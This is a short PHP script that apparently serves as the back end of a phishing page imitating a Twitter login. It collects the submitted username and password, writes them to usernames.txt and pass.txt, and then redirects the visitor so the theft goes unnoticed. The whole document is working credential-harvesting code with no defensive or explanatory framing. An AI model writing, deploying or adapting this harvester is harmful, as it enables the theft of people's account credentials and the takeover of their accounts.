<?php

file_put_contents("usernames.txt", "Twitter Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Twitter Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: redirecturl');
?>
